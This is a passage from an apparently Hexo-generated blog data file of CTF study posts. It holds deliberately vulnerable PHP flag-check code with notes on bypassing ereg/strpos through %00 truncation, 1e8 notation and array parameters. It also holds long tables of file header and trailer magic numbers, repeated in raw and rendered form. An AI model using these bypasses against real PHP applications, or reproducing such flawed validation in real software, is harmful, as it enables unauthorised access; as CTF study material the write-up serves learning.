class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">$flag &#x3D; &quot;xxx&quot;;</span><br><span class=\"line\">if (isset ($_GET[&#39;password&#39;]))</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">if (ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&#39;password&#39;]) &#x3D;&#x3D;&#x3D; FALSE)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">echo &#39;</span><br><span class=\"line\"></span><br><span class=\"line\">You password must be alphanumeric</span><br><span class=\"line\"></span><br><span class=\"line\">&#39;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">else if (strlen($_GET[&#39;password&#39;]) &lt; 8 &amp;&amp; $_GET[&#39;password&#39;] &gt; 9999999)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">if (strpos ($_GET[&#39;password&#39;], &#39;-&#39;) !&#x3D;&#x3D; FALSE) &#x2F;&#x2F;strpos — 查找字符串首次出现的位置</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">die(&#39;Flag: &#39; . $flag);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">else</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">echo(&#39;</span><br><span class=\"line\">- have not been found</span><br><span class=\"line\"></span><br><span class=\"line\">&#39;);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">else</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">echo &#39;</span><br><span class=\"line\">Invalid password</span><br><span class=\"line\"></span><br><span class=\"line\">&#39;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p>看来一下代码 &lt;8,&gt;9999999,存在矛盾</p>\n<p>ereg()函数用指定的模式搜索一个字符串中指定的字符串,如果匹配成功返回true,否则,则返回false。</p>\n<p>用正则匹配，如果有’a-zA-Z0-9’则直接错误，我们可以用%00来截断，在%00之后的数值函数无法识别,同时满足   strlen($_GET[‘password’]) &lt; 8 &amp;&amp; $_GET[‘password’] &gt; 9999999</p>\n<p>长度跟数值本来就矛盾，我们可以用1e8 即1x10的八次方或者用数组绕过。</p>\n<p>strpos() 查找某字符串在另一字符串中第一次出现的位置（区分大小写），本题中需要匹配到”<em>-</em>“才能输出flag。<br><img src=\"https://img-blog.csdnimg.cn/20200504192904986.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br><strong>0×04.strpos数组绕过</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">$flag &#x3D; &quot;flag&quot;;</span><br><span class=\"line\">if (isset ($_GET[&#39;ctf&#39;])) &#123;</span><br><span class=\"line\">if (@ereg (&quot;^[1-9]+$&quot;, $_GET[&#39;ctf&#39;]) &#x3D;&#x3D;&#x3D; FALSE)</span><br><span class=\"line\">echo &#39;必须输入数字才行&#39;;</span><br><span class=\"line\">else if (strpos ($_GET[&#39;ctf&#39;], &#39;#biubiubiu&#39;) !&#x3D;&#x3D; FALSE)</span><br><span class=\"line\">die(&#39;Flag: &#39;.$flag);</span><br><span class=\"line\">else</span><br><span class=\"line\">echo &#39;骚年，继续努力吧啊~&#39;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p>看看代码<br>首先看到的是get传参 ctf，然后必须是数字，然后再绕过 strpos。<br>strpos函数可以用数组绕过。<br><img src=\"https://img-blog.csdnimg.cn/20200504214809607.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>emmmmm，flag到手。</p>\n"},{"title":"CTF杂项题，文件头文件尾格式总结！","date":"2020-04-10T07:04:05.000Z","photos":["https://cdn.jsdelivr.net/gh/yremp/cdn@2.1.5/img/cover/(1).jpg.webp"],"_content":"\n\n\nzip文件学习\n\n﻿**1.文件头文件尾总结**\nJPEG (jpg)，                        　　文件头：FFD8FF　　　　　　　　　　　　　　　　　　　　　　　 文件尾：FF D9　　　　　　　　　　　　　　　\nPNG (png)，                       　　 文件头：89504E47　　　　　　　　　　　　　　　　　　　　　　文件尾：AE 42 60 82\nGIF (gif)，                           　　文件头：47494638　　　　　　　　　　　　　　　　　　　　　　文件尾：00 3B                                                                 ZIP Archive (zip)，                     文件头：504B0304　　　　　　　　　　　　　　　　　　　　　　文件尾：50 4B\n\nTIFF (tif)，                           　  文件头：49492A00　　　　　　　　　　　　　　　　　　　　　　文件尾：\nWindows Bitmap (bmp)，      　  文件头：424D　　　　　　　　　　　　　　　　　　　　　　　　 文件尾：\nCAD (dwg)，                        　  文件头：41433130　　　　　　　　　　　　　　　　　　　　　　文件尾：\nAdobe Photoshop (psd)，          文件头：38425053　　　　　　　　　　　　　　　　　　　　　　文件尾：\nRich Text Format (rtf)，             文件头：7B5C727466　　　　　　　　　　　　　　　　　　　　  文件尾：\nXML (xml)，                              文件头：3C3F786D6C　　　　　　　　　　　　　　　　　　　　 文件尾：\nHTML (html)，                           文件头：68746D6C3E\nEmail [thorough only] (eml)，     文件头：44656C69766572792D646174653A\nOutlook Express (dbx)，            文件头：CFAD12FEC5FD746F\nOutlook (pst)，                         文件头：2142444E\nMS Word/Excel (xls.or.doc)，      文件头：D0CF11E0\nMS Access (mdb)，                    文件头：5374616E64617264204A\nWordPerfect (wpd)，                  文件头：FF575043\nAdobe Acrobat (pdf)，               文件头：255044462D312E\nQuicken (qdf)，                         文件头：AC9EBD8F\nWindows Password (pwl)，         文件头：E3828596\n\nRAR Archive (rar)，                    文件头：52617221\nWave (wav)，                            文件头：57415645\nAVI (avi)，                                 文件头：41564920\nReal Audio (ram)，                     文件头：2E7261FD\nReal Media (rm)，                       文件头：2E524D46\nMPEG (mpg)，                           文件头：000001BA\nMPEG (mpg)，                           文件头：000001B3\nQuicktime (mov)，                     文件头：6D6F6F76\nWindows Media (asf)，               文件头：3026B2758E66CF11\nMIDI (mid)，                              文件头：4D546864\n**2.从winhex中取出的文件头列表**\n\nFile Type ExtensionsHeader\n\nJPEG jpg;jpeg 0xFFD8FF\n\nPNG png 0x89504E470D0A1A0A\n\nGIF gif GIF8\n\nTIFF tif;tiff 0x49492A00\n\nTIFF tif;tiff 0x4D4D002A\n\nBit map bmp BM\n\nAOL ART art 0x4A47040E000000\n\nAOL ART art 0x4A47030E000000\n\nPC Paintbrush pcx 0x0A050108\n\nGraphics Metafile wmf 0xD7CDC69A\n\nGraphics Metafile wmf 0x01000900\n\nGraphics Metafile wmf 0x02000900\n\nEnhanced Metafile emf 0x0100000058000000\n\nCorel Draw cdr CDR\n\nCAD dwg 0x41433130\n\nAdobe Photoshop psd 8BPS\n\nRich Text Format rtf rtf\n\nXML xml\n\nHTML html;htm;PHP;php3;php4;phtml;shtml type\n\nEmail eml Delivery-date:\n\nOutlook Express dbx 0xCFAD12FE\n\nOutlookpst!BDN\n\nMS Office/OLE2doc;xls;dot;ppt;xla;ppa;pps;pot;msi;sdw;db 0xD0CF11E0A1B11AE1\n\nMS Access mdb;mda;mde;mdt Standard J\n\nWordPerfect wpd 0xFF575043\n\nOpenOffice Writer sxw writer\n\nOpenOffice Calc sxc calc\n\nOpenOffice Math sxm math\n\nOpenOffice Impress sxi impress\n\nOpenOffice Draw sxd draw\n\nAdobe FrameMaker fm <MAKERFILE\n\nPostScript eps.or.ps;ps;eps %!PS-Adobe\n\nAdobe Acrobat pdf %PDF-1.\n\nQuicken qdf 0xAC9EBD8F\n\nQuickBooks Backup qbb 0x458600000600\n\nSage sly.or.srt.or.slt;sly;srt;slt0x53520100\n\nSage Backup 1 SAGEBACKUP\n\nLotus WordPro v9 lwp 0x576F726450726F\n\nLotus 123 v9 123 0x00001A00051004\n\nLotus 123 v5 wk4 0x00001A0002100400\n\nLotus 123 v3 wk3 0x00001A0000100400\n\nLotus 123 v1 wk1 0x2000604060\n\nWindows Password pwl 0xE3828596\n\nZIP Archive zip;jar 0x504B0304\n\nZIP Archive (outdated) zip 0x504B3030\n\nRAR Archive rar Rar!\n\nGZ Archive gz;tgz 0x1F8B08\n**3.各种文件类型文件头标志位详细列表**\n\nFFD8FFFE00, .JPEG;.JPE;.JPG, \"JPGGraphic File\"\n\nFFD8FFE000, .JPEG;.JPE;.JPG, \"JPGGraphic File\"\n\n474946383961, .gif, \"GIF 89A\"\n\n474946383761, .gif, \"GIF 87A\"\n\n424D, .bmp, \"Windows Bitmap\"\n\n4D5A,.exe;.com;.386;.ax;.acm;.sys;.dll;.drv;.flt;.fon;.ocx;.scr;.lrc;.vxd;\n\n.cpl;.x32, \"Executable File\"\n\n504B0304, .zip, \"Zip Compressed\"\n\n3A42617365, .cnt, \"\"\n\nD0CF11E0A1B11AE1,.doc;.xls;.xlt;.ppt;.apr, \"MS Compound Document v1 or Lotus Approach APRfile\"\n\n0100000058000000, .emf, \"\"\n\n03000000C466C456, .evt, \"\"\n\n3F5F0300, .gid;.hlp;.lhp, \"Windows HelpFile\"\n\n1F8B08, .gz, \"GZ Compressed File\"\n\n28546869732066696C65, .hqx, \"\"\n\n0000010000, .ico, \"Icon File\"\n\n4C000000011402, .lnk, \"Windows LinkFile\"\n\n25504446, .pdf, \"Adobe PDF File\"\n\n5245474544495434, .reg, \"\"\n\n7B5C727466,.rtf, \"Rich Text Format File\"\n\nlh, .lzh, \"Lz compression file\"\n\nMThd, .mid, \"\"\n\n0A050108, .pcx, \"\"\n\n25215053, .eps, \"Adobe EPS File\"\n\n2112, .ain, \"AIN Archive File\"\n\n1A02, .arc, \"ARC/PKPAK Compressed 1\"\n\n1A03, .arc, \"ARC/PKPAK Compressed 2\"\n\n1A04, .arc, \"ARC/PKPAK Compressed 3\"\n\n1A08, .arc, \"ARC/PKPAK Compressed 4\"\n\n1A09, .arc, \"ARC/PKPAK Compressed 5\"\n\n60EA, .arj, \"ARJ Compressed\"\n\n41564920, .avi, \"Audio Video Interleave(AVI)\"\n\n425A68, .bz;.bz2, \"Bzip Archive\"\n\n49536328, .cab, \"Cabinet File\"\n\n4C01, .obj, \"Compiled Object Module\"\n\n303730373037, .tar;.cpio, \"CPIO ArchiveFile\"\n\n4352555348, .cru;.crush, \"CRUSH ArchiveFile\"\n\n3ADE68B1, .dcx, \"DCX Graphic File\"\n\n1F8B, .gz;.tar;.tgz, \"Gzip ArchiveFile\"\n\n91334846, .hap, \"HAP Archive File\"\n\n3C68746D6C3E,.htm;.html, \"HyperText Markup Language 1\"\n\n3C48544D4C3E,.htm;.html, \"HyperText Markup Language 2\"\n\n3C21444F4354, .htm;.html, \"HyperText MarkupLanguage 3\"\n\n100, .ico, \"ICON File\"\n\n5F27A889, .jar, \"JAR Archive File\"\n\n2D6C68352D,.lha, \"LHA Compressed\"\n\n20006040600, .wk1;.wks, \"Lotus 123 v1 Worksheet\"\n\n00001A0007800100, .fm3, \"Lotus 123 v3 FMTfile\"\n\n00001A0000100400, .wk3, \"Lotus 123 v3Worksheet\"\n\n20006800200, .fmt, \"Lotus 123 v4 FMTfile\"\n\n00001A0002100400, .wk4, \"Lotus 123 v5\"\n\n5B7665725D, .ami, \"Lotus Ami Pro\"\n\n300000041505052, .adx, \"Lotus ApproachADX file\"\n\n1A0000030000, .nsf;.ntf, \"Lotus NotesDatabase/Template\"\n\n4D47582069747064, .ds4, \"MicrografixDesigner 4\"\n\n4D534346, .cab, \"Microsoft CAB FileFormat\"\n\n4D546864, .mid, \"Midi Audio File\"\n\n000001B3, .mpg;.mpeg, \"MPEG Movie\"\n\n0902060000001000B9045C00, .xls, \"MS Excel v2\"\n\n0904060000001000F6055C00, .xls, \"MS Excel v4\"\n\n7FFE340A,.doc, \"MS Word\"\n\n1234567890FF, .doc, \"MS Word 6.0\"\n\n31BE000000AB0000, .doc, \"MS Word forDOS 6.0\"\n\n1A00000300001100, .nsf, \"NotesDatabase\"\n\n7E424B00, .psp, \"PaintShop Pro Image File\"\n\n504B0304, .zip, \"PKZIP Compressed\"\n\n89504E470D0A, .png, \"PNG Image File\"\n\n6D646174, .mov, \"QuickTime Movie\"\n\n6D646174, .qt, \"Quicktime MovieFile\"\n\n52617221, .rar, \"RAR Archive File\"\n\n2E7261FD, .ra;.ram, \"Real AudioFile\"\n\nEDABEEDB, .rpm, \"RPM Archive File\"\n\n2E736E64, .au, \"SoundMachine AudioFile\"\n\n53495421, .sit, \"Stuffit v1 ArchiveFile\"\n\n53747566664974, .sit, \"Stuffit v5Archive File\"\n\n1F9D, .z, \"TAR Compressed ArchiveFile\"\n\n49492A, .tif;.tiff, \"TIFF (Intel)\"\n\n4D4D2A,.tif;.tiff, \"TIFF (Motorola)\"\n\n554641, .ufa, \"UFA Archive File\"\n\n57415645666D74, .wav, \"Wave Files\"\n\nD7CDC69A,.wmf, \"Windows Meta File\"\n\n4C000000, .lnk, \"Windows Shortcut (LinkFile)\"\n\n504B3030504B0304, .zip, \"WINZIPCompressed\"\n\nFF575047, .wpg, \"WordPerfectGraphics\"\n\nFF575043, .wp, \"WordPerfect v5 orv6\"\n\n3C3F786D6C,.xml, \"XML Document\"\n\nFFFE3C0052004F004F0054005300540055004200, .xml, \"XML Document(ROOTSTUB)\"\n\n3C21454E54495459, .dtd, \"XML DTD\"\n\n5A4F4F20, .zoo, \"ZOO Archive File\"\n第三部分我也是很懵！！！以后总归是要用到的，先留下来吧。\n[大佬的博客](http://www.cnblogs.com/lwy-kitty/p/3928317.html)\n\n","source":"_posts/CTF杂项题，文件头文件尾格式总结！.md","raw":"---\ntitle: CTF杂项题，文件头文件尾格式总结！\ndate: 2020-04-10 15:04:05\ntags: web\ncategories: 技术\nphotos:  https://cdn.jsdelivr.net/gh/yremp/cdn@2.1.5/img/cover/(1).jpg.webp\n---\n\n\n\nzip文件学习\n\n﻿**1.文件头文件尾总结**\nJPEG (jpg)，                        　　文件头：FFD8FF　　　　　　　　　　　　　　　　　　　　　　　 文件尾：FF D9　　　　　　　　　　　　　　　\nPNG (png)，                       　　 文件头：89504E47　　　　　　　　　　　　　　　　　　　　　　文件尾：AE 42 60 82\nGIF (gif)，                           　　文件头：47494638　　　　　　　　　　　　　　　　　　　　　　文件尾：00 3B                                                                 ZIP Archive (zip)，                     文件头：504B0304　　　　　　　　　　　　　　　　　　　　　　文件尾：50 4B\n\nTIFF (tif)，                           　  文件头：49492A00　　　　　　　　　　　　　　　　　　　　　　文件尾：\nWindows Bitmap (bmp)，      　  文件头：424D　　　　　　　　　　　　　　　　　　　　　　　　 文件尾：\nCAD (dwg)，                        　  文件头：41433130　　　　　　　　　　　　　　　　　　　　　　文件尾：\nAdobe Photoshop (psd)，          文件头：38425053　　　　　　　　　　　　　　　　　　　　　　文件尾：\nRich Text Format (rtf)，             文件头：7B5C727466　　　　　　　　　　　　　　　　　　　　  文件尾：\nXML (xml)，                              文件头：3C3F786D6C　　　　　　　　　　　　　　　　　　　　 文件尾：\nHTML (html)，                           文件头：68746D6C3E\nEmail [thorough only] (eml)，     文件头：44656C69766572792D646174653A\nOutlook Express (dbx)，            文件头：CFAD12FEC5FD746F\nOutlook (pst)，                         文件头：2142444E\nMS Word/Excel (xls.or.doc)，      文件头：D0CF11E0\nMS Access (mdb)，                    文件头：5374616E64617264204A\nWordPerfect (wpd)，                  文件头：FF575043\nAdobe Acrobat (pdf)，               文件头：255044462D312E\nQuicken (qdf)，                         文件头：AC9EBD8F\nWindows Password (pwl)，         文件头：E3828596\n\nRAR Archive (rar)，                    文件头：52617221\nWave (wav)，                            文件头：57415645\nAVI (avi)，                                 文件头：41564920\nReal Audio (ram)，                     文件头：2E7261FD\nReal Media (rm)，                       文件头：2E524D46\nMPEG (mpg)，                           文件头：000001BA\nMPEG (mpg)，                           文件头：000001B3\nQuicktime (mov)，                     文件头：6D6F6F76\nWindows Media (asf)，               文件头：3026B2758E66CF11\nMIDI (mid)，                              文件头：4D546864\n**2.从winhex中取出的文件头列表**\n\nFile Type ExtensionsHeader\n\nJPEG jpg;jpeg 0xFFD8FF\n\nPNG png 0x89504E470D0A1A0A\n\nGIF gif GIF8\n\nTIFF tif;tiff 0x49492A00\n\nTIFF tif;tiff 0x4D4D002A\n\nBit map bmp BM\n\nAOL ART art 0x4A47040E000000\n\nAOL ART art 0x4A47030E000000\n\nPC Paintbrush pcx 0x0A050108\n\nGraphics Metafile wmf 0xD7CDC69A\n\nGraphics Metafile wmf 0x01000900\n\nGraphics Metafile wmf 0x02000900\n\nEnhanced Metafile emf 0x0100000058000000\n\nCorel Draw cdr CDR\n\nCAD dwg 0x41433130\n\nAdobe Photoshop psd 8BPS\n\nRich Text Format rtf rtf\n\nXML xml\n\nHTML html;htm;PHP;php3;php4;phtml;shtml type\n\nEmail eml Delivery-date:\n\nOutlook Express dbx 0xCFAD12FE\n\nOutlookpst!BDN\n\nMS Office/OLE2doc;xls;dot;ppt;xla;ppa;pps;pot;msi;sdw;db 0xD0CF11E0A1B11AE1\n\nMS Access mdb;mda;mde;mdt Standard J\n\nWordPerfect wpd 0xFF575043\n\nOpenOffice Writer sxw writer\n\nOpenOffice Calc sxc calc\n\nOpenOffice Math sxm math\n\nOpenOffice Impress sxi impress\n\nOpenOffice Draw sxd draw\n\nAdobe FrameMaker fm <MAKERFILE\n\nPostScript eps.or.ps;ps;eps %!PS-Adobe\n\nAdobe Acrobat pdf %PDF-1.\n\nQuicken qdf 0xAC9EBD8F\n\nQuickBooks Backup qbb 0x458600000600\n\nSage sly.or.srt.or.slt;sly;srt;slt0x53520100\n\nSage Backup 1 SAGEBACKUP\n\nLotus WordPro v9 lwp 0x576F726450726F\n\nLotus 123 v9 123 0x00001A00051004\n\nLotus 123 v5 wk4 0x00001A0002100400\n\nLotus 123 v3 wk3 0x00001A0000100400\n\nLotus 123 v1 wk1 0x2000604060\n\nWindows Password pwl 0xE3828596\n\nZIP Archive zip;jar 0x504B0304\n\nZIP Archive (outdated) zip 0x504B3030\n\nRAR Archive rar Rar!\n\nGZ Archive gz;tgz 0x1F8B08\n**3.各种文件类型文件头标志位详细列表**\n\nFFD8FFFE00, .JPEG;.JPE;.JPG, \"JPGGraphic File\"\n\nFFD8FFE000, .JPEG;.JPE;.JPG, \"JPGGraphic File\"\n\n474946383961, .gif, \"GIF 89A\"\n\n474946383761, .gif, \"GIF 87A\"\n\n424D, .bmp, \"Windows Bitmap\"\n\n4D5A,.exe;.com;.386;.ax;.acm;.sys;.dll;.drv;.flt;.fon;.ocx;.scr;.lrc;.vxd;\n\n.cpl;.x32, \"Executable File\"\n\n504B0304, .zip, \"Zip Compressed\"\n\n3A42617365, .cnt, \"\"\n\nD0CF11E0A1B11AE1,.doc;.xls;.xlt;.ppt;.apr, \"MS Compound Document v1 or Lotus Approach APRfile\"\n\n0100000058000000, .emf, \"\"\n\n03000000C466C456, .evt, \"\"\n\n3F5F0300, .gid;.hlp;.lhp, \"Windows HelpFile\"\n\n1F8B08, .gz, \"GZ Compressed File\"\n\n28546869732066696C65, .hqx, \"\"\n\n0000010000, .ico, \"Icon File\"\n\n4C000000011402, .lnk, \"Windows LinkFile\"\n\n25504446, .pdf, \"Adobe PDF File\"\n\n5245474544495434, .reg, \"\"\n\n7B5C727466,.rtf, \"Rich Text Format File\"\n\nlh, .lzh, \"Lz compression file\"\n\nMThd, .mid, \"\"\n\n0A050108, .pcx, \"\"\n\n25215053, .eps, \"Adobe EPS File\"\n\n2112, .ain, \"AIN Archive File\"\n\n1A02, .arc, \"ARC/PKPAK Compressed 1\"\n\n1A03, .arc, \"ARC/PKPAK Compressed 2\"\n\n1A04, .arc, \"ARC/PKPAK Compressed 3\"\n\n1A08, .arc, \"ARC/PKPAK Compressed 4\"\n\n1A09, .arc, \"ARC/PKPAK Compressed 5\"\n\n60EA, .arj, \"ARJ Compressed\"\n\n41564920, .avi, \"Audio Video Interleave(AVI)\"\n\n425A68, .bz;.bz2, \"Bzip Archive\"\n\n49536328, .cab, \"Cabinet File\"\n\n4C01, .obj, \"Compiled Object Module\"\n\n303730373037, .tar;.cpio, \"CPIO ArchiveFile\"\n\n4352555348, .cru;.crush, \"CRUSH ArchiveFile\"\n\n3ADE68B1, .dcx, \"DCX Graphic File\"\n\n1F8B, .gz;.tar;.tgz, \"Gzip ArchiveFile\"\n\n91334846, .hap, \"HAP Archive File\"\n\n3C68746D6C3E,.htm;.html, \"HyperText Markup Language 1\"\n\n3C48544D4C3E,.htm;.html, \"HyperText Markup Language 2\"\n\n3C21444F4354, .htm;.html, \"HyperText MarkupLanguage 3\"\n\n100, .ico, \"ICON File\"\n\n5F27A889, .jar, \"JAR Archive File\"\n\n2D6C68352D,.lha, \"LHA Compressed\"\n\n20006040600, .wk1;.wks, \"Lotus 123 v1 Worksheet\"\n\n00001A0007800100, .fm3, \"Lotus 123 v3 FMTfile\"\n\n00001A0000100400, .wk3, \"Lotus 123 v3Worksheet\"\n\n20006800200, .fmt, \"Lotus 123 v4 FMTfile\"\n\n00001A0002100400, .wk4, \"Lotus 123 v5\"\n\n5B7665725D, .ami, \"Lotus Ami Pro\"\n\n300000041505052, .adx, \"Lotus ApproachADX file\"\n\n1A0000030000, .nsf;.ntf, \"Lotus NotesDatabase/Template\"\n\n4D47582069747064, .ds4, \"MicrografixDesigner 4\"\n\n4D534346, .cab, \"Microsoft CAB FileFormat\"\n\n4D546864, .mid, \"Midi Audio File\"\n\n000001B3, .mpg;.mpeg, \"MPEG Movie\"\n\n0902060000001000B9045C00, .xls, \"MS Excel v2\"\n\n0904060000001000F6055C00, .xls, \"MS Excel v4\"\n\n7FFE340A,.doc, \"MS Word\"\n\n1234567890FF, .doc, \"MS Word 6.0\"\n\n31BE000000AB0000, .doc, \"MS Word forDOS 6.0\"\n\n1A00000300001100, .nsf, \"NotesDatabase\"\n\n7E424B00, .psp, \"PaintShop Pro Image File\"\n\n504B0304, .zip, \"PKZIP Compressed\"\n\n89504E470D0A, .png, \"PNG Image File\"\n\n6D646174, .mov, \"QuickTime Movie\"\n\n6D646174, .qt, \"Quicktime MovieFile\"\n\n52617221, .rar, \"RAR Archive File\"\n\n2E7261FD, .ra;.ram, \"Real AudioFile\"\n\nEDABEEDB, .rpm, \"RPM Archive File\"\n\n2E736E64, .au, \"SoundMachine AudioFile\"\n\n53495421, .sit, \"Stuffit v1 ArchiveFile\"\n\n53747566664974, .sit, \"Stuffit v5Archive File\"\n\n1F9D, .z, \"TAR Compressed ArchiveFile\"\n\n49492A, .tif;.tiff, \"TIFF (Intel)\"\n\n4D4D2A,.tif;.tiff, \"TIFF (Motorola)\"\n\n554641, .ufa, \"UFA Archive File\"\n\n57415645666D74, .wav, \"Wave Files\"\n\nD7CDC69A,.wmf, \"Windows Meta File\"\n\n4C000000, .lnk, \"Windows Shortcut (LinkFile)\"\n\n504B3030504B0304, .zip, \"WINZIPCompressed\"\n\nFF575047, .wpg, \"WordPerfectGraphics\"\n\nFF575043, .wp, \"WordPerfect v5 orv6\"\n\n3C3F786D6C,.xml, \"XML Document\"\n\nFFFE3C0052004F004F0054005300540055004200, .xml, \"XML Document(ROOTSTUB)\"\n\n3C21454E54495459, .dtd, \"XML DTD\"\n\n5A4F4F20, .zoo, \"ZOO Archive File\"\n第三部分我也是很懵！！！以后总归是要用到的，先留下来吧。\n[大佬的博客](http://www.cnblogs.com/lwy-kitty/p/3928317.html)\n\n","slug":"CTF杂项题，文件头文件尾格式总结！","published":1,"updated":"2020-05-11T08:48:37.714Z","comments":1,"layout":"post","link":"","_id":"ckchhpsgl00059kq62x70965q","content":"<p>zip文件学习</p>\n<p>﻿<strong>1.文件头文件尾总结</strong><br>JPEG (jpg)，                        　　文件头：FFD8FF　　　　　　　　　　　　　　　　　　　　　　　 文件尾：FF D9　　　　　　　　　　　　　　　<br>PNG (png)，                       　　 文件头：89504E47　　　　　　　　　　　　　　　　　　　　　　文件尾：AE 42 60 82<br>GIF (gif)，                           　　文件头：47494638　　　　　　　　　　　　　　　　　　　　　　文件尾：00 3B                                                                 ZIP Archive (zip)，                     文件头：504B0304　　　　　　　　　　　　　　　　　　　　　　文件尾：50 4B</p>\n<p>TIFF (tif)，                           　  文件头：49492A00　　　　　　　　　　　　　　　　　　　　　　文件尾：<br>Windows Bitmap (bmp)，      　  文件头：424D　　　　　　　　　　　　　　　　　　　　　　　　 文件尾：<br>CAD (dwg)，                        　  文件头：41433130　　　　　　　　　　　　　　　　　　　　　　文件尾：<br>Adobe Photoshop (psd)，          文件头：38425053　　　　　　　　　　　　　　　　　　　　　　文件尾：<br>Rich Text Format (rtf)，             文件头：7B5C727466　　　　　　　　　　　　　　　　　　　　  文件尾：<br>XML (xml)，                              文件头：3C3F786D6C　　　　　　　　　　　　　　　　　　　　 文件尾：<br>HTML (html)，                           文件头：68746D6C3E<br>Email [thorough only] (eml)，     文件头：44656C69766572792D646174653A<br>Outlook Express (dbx)，            文件头：CFAD12FEC5FD746F<br>Outlook (pst)，                         文件头：2142444E<br>MS Word/Excel (xls.or.doc)，      文件头：D0CF11E0<br>MS Access (mdb)，                    文件头：5374616E64617264204A<br>WordPerfect (wpd)，                  文件头：FF575043<br>Adobe Acrobat (pdf)，               文件头：255044462D312E<br>Quicken (qdf)，                         文件头：AC9EBD8F<br>Windows Password (pwl)，         文件头：E3828596</p>\n<p>RAR Archive (rar)，                    文件头：52617221<br>Wave (wav)，                            文件头：57415645<br>AVI (avi)，                                 文件头：41564920<br>Real Audio (ram)，                     文件头：2E7261FD<br>Real Media (rm)，                       文件头：2E524D46<br>MPEG (mpg)，                           文件头：000001BA<br>MPEG (mpg)，                           文件头：000001B3<br>Quicktime (mov)，                     文件头：6D6F6F76<br>Windows Media (asf)，               文件头：3026B2758E66CF11<br>MIDI (mid)，                              文件头：4D546864<br><strong>2.从winhex中取出的文件头列表</strong></p>\n<p>File Type ExtensionsHeader</p>\n<p>JPEG jpg;jpeg 0xFFD8FF</p>\n<p>PNG png 0x89504E470D0A1A0A</p>\n<p>GIF gif GIF8</p>\n<p>TIFF tif;tiff 0x49492A00</p>\n<p>TIFF tif;tiff 0x4D4D002A</p>\n<p>Bit map bmp BM</p>\n<p>AOL ART art 0x4A47040E000000</p>\n<p>AOL ART art 0x4A47030E000000</p>\n<p>PC Paintbrush pcx 0x0A050108</p>\n<p>Graphics Metafile wmf 0xD7CDC69A</p>\n<p>Graphics Metafile wmf 0x01000900</p>\n<p>Graphics Metafile wmf 0x02000900</p>\n<p>Enhanced Metafile emf 0x0100000058000000</p>\n<p>Corel Draw cdr CDR</p>\n<p>CAD dwg 0x41433130</p>\n<p>Adobe Photoshop psd 8BPS</p>\n<p>Rich Text Format rtf rtf</p>\n<p>XML xml</p>\n<p>HTML html;htm;PHP;php3;php4;phtml;shtml type</p>\n<p>Email eml Delivery-date:</p>\n<p>Outlook Express dbx 0xCFAD12FE</p>\n<p>Outlookpst!BDN</p>\n<p>MS Office/OLE2doc;xls;dot;ppt;xla;ppa;pps;pot;msi;sdw;db 0xD0CF11E0A1B11AE1</p>\n<p>MS Access mdb;mda;mde;mdt Standard J</p>\n<p>WordPerfect wpd 0xFF575043</p>\n<p>OpenOffice Writer sxw writer</p>\n<p>OpenOffice Calc sxc calc</p>\n<p>OpenOffice Math sxm math</p>\n<p>OpenOffice Impress sxi impress</p>\n<p>OpenOffice Draw sxd draw</p>\n<p>Adobe FrameMaker fm &lt;MAKERFILE</p>\n<p>PostScript eps.or.ps;ps;eps %!PS-Adobe</p>\n<p>Adobe Acrobat pdf %PDF-1.</p>\n<p>Quicken qdf 0xAC9EBD8F</p>\n<p>QuickBooks Backup qbb 0x458600000600</p>\n<p>Sage sly.or.srt.or.slt;sly;srt;slt0x53520100</p>\n<p>Sage Backup 1 SAGEBACKUP</p>\n<p>Lotus WordPro v9 lwp 0x576F726450726F</p>\n<p>Lotus 123 v9 123 0x00001A00051004</p>\n<p>Lotus 123 v5 wk4 0x00001A0002100400</p>\n<p>Lotus 123 v3 wk3 0x00001A0000100400</p>\n<p>Lotus 123 v1 wk1 0x2000604060</p>\n<p>Windows Password pwl 0xE3828596</p>\n<p>ZIP Archive zip;jar 0x504B0304</p>\n<p>ZIP Archive (outdated) zip 0x504B3030</p>\n<p>RAR Archive rar Rar!</p>\n<p>GZ Archive gz;tgz 0x1F8B08<br><strong>3.各种文件类型文件头标志位详细列表</strong></p>\n<p>FFD8FFFE00, .JPEG;.JPE;.JPG, “JPGGraphic File”</p>\n<p>FFD8FFE000, 